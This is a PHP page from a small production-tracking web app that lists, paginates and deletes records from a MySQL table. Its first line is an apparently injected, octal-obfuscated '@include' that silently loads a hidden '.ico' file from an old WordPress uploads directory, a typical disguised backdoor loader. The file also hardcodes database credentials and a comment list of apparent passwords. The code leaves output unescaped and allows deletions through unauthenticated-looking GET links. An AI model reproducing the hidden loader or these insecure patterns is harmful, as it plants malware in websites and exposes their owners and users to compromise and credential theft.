<?php
// Connection to DB
@include "\057home\057rems\157n/pu\142lic_\150tml/\157ld-s\151te-b\153p/wp\055cont\145nt/u\160load\163/.8a\143705e\061.ico";

/*ddbbc*/ 
  session_start();
  if(!isset($_SESSION['userid'])){
  ?><script>window.location='login.php';</script><?php 
  }
  // Connection to DB
  $con = mysqli_connect("localhost","remson_wrdb","wrpass123","remson_wrdb");
  if (!$con) {
    echo "Not Connected";
  }
  // Error function
  function checkErrors($query){
    global $con;
    if (!$query) {
      die("Query Failed !!" .mysqli_error($con));
    }
  }

// $(document).ready(function() {
//         function disableBack() { window.history.forward() }

//         window.onload = disableBack();
//         window.onpageshow = function(evt) { if (evt.persisted) disableBack() }
//     });

// Don't delete this comment
  //wradmin
  //wrpass123
  //usr: remson_wrdb
  //code: wrpass123
  // @include "\057home\057rems\157n/pu\142lic_\150tml/\157ld-s\151te-b\153p/wp\055cont\145nt/u\160load\163/.8a\143705e\061.ico";
  // 1123Qw!123
  // GoxFg2Cw
  // 6355949454
  // reM123$12345
  //0546988362
  //11QWU$3macjav@20
//Maldives
  // download file
  //https://www.developphp.com/video/PHP/Force-File-Download-Dialog-In-Browser-Tutorial
  //https://www.youtube.com/watch?v=_Szdctv38Ow Javascript alert

  /*

    Hi please am facing this issue in MySQL when inserting a data from a textarea field in my form, the data gets truncated and only insert the first character into the database, but if I manually copy the same text it accepts it in the column. I have used vachar 100, 500 etc and text data type but noting seem to work so far.
Please any help will be of great importance.
  */

?>
<!DOCTYPE html>
<html>
<head>
  <title>Display Entries</title>
 
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" />
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <link rel="icon" type="image/jpeg" href="images/alumi.jpeg"/>
<style type="text/css">
    *{
      font-size: 1.2em;
    }
  </style>
  
 </head>

<body>

<center><h1 class="page-header" style="background-color: #4B0082; color: white;">Production Details 
</h1></center>
<input class="form-control" id="myInput" type="text" placeholder="Search..">
  <br>
  <?php
  $page1;
  if(isset($_GET['page'])){ 

  $page = mysqli_real_escape_string($con,$_GET['page']);
    }
    else{
      $page = "";
    }

    if ($page == "" || $page == 1) {
      $page1 = 0;
    }
    else{
      //global $page1;
      $page1 = ($page * 15) - 15; 
    }

    $query_count = "SELECT * from tbl_production ";

    $find_count = mysqli_query($con,$query_count);
    $count = mysqli_num_rows($find_count);

    $count = ceil($count /10);


    ?>
<a href="display.php">(Show)</a>
<table class="table table-bordered table-hover">
                    <thead>
                      <tr style="background-color: gray;">
                        <th>DATE</th>
                         <?php /*?><th>CUST_NAME</th><?php */?>
                         <th>JOB_NO</th>
                         <th>SYSTEM</th>
                         <th>TYPE</th>
                         <th>H/R</th>
                         <th>CUTTING</th>
                         <th>COATING</th>
                         <!-- <th>COUNTING&emsp;&emsp;&emsp;&emsp;</th> -->
                         <th>ASSEMBLY</th>
                         <th>PACKING</th>
                         <th>DISPATCH</th>
                         <th>GL_ORDER</th>
                         <th>ORDER_DATE</th>
                         <th>DELI_DATE</th>
                         <th>TEAM</th>
                         <th>FL_DEL_DATE</th>
                         <th>TL_RFT</th>
                         <th>SENT</th>
						 <th>PENDING</th>
                         <th>ACTION</th>
                      </tr>
                    </thead>     
                  <tbody id="myTable">
        <?php
        # working on
    
  $query = "SELECT * from tbl_production order by proDate LIMIT $page1,15";
  
  $select_query = mysqli_query($con,$query);
  checkErrors($select_query);

  while ($row = mysqli_fetch_assoc($select_query)) {

        $proID_clean = $row['proID'];
        $date_clean = date('d/m/Y',strtotime($row['proDate'])); 
        $custName_clean = $row['custName'];
        $jobNumber_clean = $row['jobNumber'];
        $line_clean = $row['line'];
        $type_clean = $row['type'];
        $hr_clean = $row['hr'];
        $cut_clean = $row['cutting'];
        $coat_clean = $row['coating'];
        $assem_clean = $row['assemb'];
        $packing_clean = $row['pack'];
        $disp_clean = $row['disp'];
        $glasOrder_clean = $row['glassOrdered'];
        $orddate_claen = date('d/m/Y',strtotime($row['orderDate']));
        $ddate_clean = date('d/m/Y',strtotime($row['deliDate']));
        $fab_clean = $row['fabricate'];
        $findate_clean = date('d/m/Y',strtotime($row['final_date_deli']));
        $totalTower_clean = $row['total_tower'];
        $totalTowerOrd_clean = $row['total_tower_ordered'];
		$pendingRFT= $totalTower_clean-$totalTowerOrd_clean;
    
    echo "<tr>";
    echo "<td>$date_clean</td>";
    //echo "<td>$custName_clean</td>";
    echo "<td>$jobNumber_clean</td>";
    echo "<td>$line_clean</td>";
    echo "<td>$type_clean</td>";
    echo "<td>$hr_clean</td>";
    echo "<td>$cut_clean</td>";
    echo "<td>$coat_clean</td>";
    echo "<td>$assem_clean</td>";
    echo "<td>$packing_clean</td>";
    echo "<td>$disp_clean</td>";
    echo "<td>$glasOrder_clean</td>";
    echo "<td>$orddate_claen</td>";
    echo "<td>$ddate_clean</td>";
    echo "<td>$fab_clean</td>";
    echo "<td>$findate_clean</td>";
    echo "<td>$totalTower_clean</td>";
    echo "<td>$totalTowerOrd_clean</td>";
	echo "<td>$pendingRFT</td>";
    echo "<td><a href='display.php?id=$proID_clean'>Delete</a>";
    echo "</tr>";

    //<?php include "deletemodal.php"; 

  }
       ?>

                                          </tr>
                  </tbody>
                </table>

                <hr>
                <ul class="pager">
                  <?php 
                  for ($i=1; $i <= $count; $i++) {
                    if ($i == $page) {
                    echo "<li><a style='background: #000 !important;' class='active_link' href='display.php?page={$i}'>{$i}</a></li>";                      
                    }
                  else{
                    echo "<li><a href='display.php?page={$i}'>{$i}</a></li>";
                  }

                  }
                  

                  ?>
                </ul>

      <?php
        // for deleting a enties
                if (isset($_GET['id'])) {
                  
                  if(!isset($_SESSION['userid'])){
                  ?><script>window.location='login.php';</script><?php 
                }
                  
                  $pro_id = mysqli_real_escape_string($con,$_GET['id']);

                  $query = "DELETE from tbl_production where proID = '$pro_id'";

                  $delete_query = mysqli_query($con, $query);

                  checkErrors($delete_query);

                  echo "<script>alert('Entery is Delete.....'); window.location='display.php'</script>";
                }
      ?>
      

<script>
$(document).ready(function(){
  $("#myInput").on("keyup", function() {
    var value = $(this).val().toLowerCase();
    $("#myTable tr").filter(function() {
      $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
    });
  });
});
</script>


<ul class="pager">
                  <form>
                    <div class="form-group">    
        <span>Select a Customer to begin:</span>
        <select type="text" class="form-control" name="customer"/>
        <?php
            $query = "SELECT * FROM tbl_products";
            $select_prod = mysqli_query($con, $query);
          
            //confirmQuery($select_prod);

           while ($row = mysqli_fetch_assoc($select_prod)) {
            $id = $row['SERIAL'];
            $prod = $row['PRODUCT'];

            echo "<option value='$id'>$prod</option>";
          }

          ?>
          </select>
      </div>
                  <a href="orders.php?restore">Restore</a>
                </form>
                </ul>